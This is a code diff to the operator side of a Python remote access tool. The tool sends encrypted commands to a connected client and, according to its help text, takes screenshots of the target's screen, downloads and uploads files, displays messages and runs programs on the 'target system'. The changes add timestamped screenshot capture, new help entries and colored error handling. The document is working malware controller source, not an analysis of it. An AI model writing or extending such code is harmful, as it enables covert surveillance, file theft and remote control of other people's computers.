@@ -15,6 +15,7 @@ import sys
 import base64
 from colorama import init
 from colorama import Fore, Back, Style
+from time import *
 
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -80,7 +81,12 @@ def upload(command):
 
 def download(command):
     cli.sendall(crypt(command))
-    fileName = command.replace("download ", "")
+    
+    if "screenshot()" in command: 
+        fileName = str(command.replace("screenshot() ", "").replace("download ", ""))
+    else:
+        fileName = str(command.replace("download ", ""))
+
     while True:
         l = cli.recv(1024)
 
@@ -108,12 +114,14 @@ def download(command):
 def help():
     print Fore.YELLOW + """
 Commands:
+    help()                  : Show this message.
+    screenshot()            : Take a screenshot on client and send image file to server.
     download                : Download files from client.
     upload                  : Upload files to client from server.
     message TEXT            : Show messages on target system.
     info()                  : Show target system's info.
     execute PROGRAM ARGS    : Execute programs in a new process.
-    
+
 Execute programs on local machine:
     :dir ==> with ":"
     :cls
@@ -155,7 +163,7 @@ def menu():
             upload(command)
 
         elif command == "screenshot()":
-            command = "download ss.png"
+            command = "screenshot() download %s.png"%(str(strftime("%Y-%m-%d~%H.%M.%S", gmtime())))
             download(command)
 
         elif "download" in command:
@@ -172,8 +180,8 @@ def start():
             main()
             menu()
         except Exception as e:
-	    print e
-	    start()
+	       print bright + Fore.RED + "Error:\n%s\n"%(e)
+	       start()
 
 if __name__ == "__main__":
     init(autoreset=True)
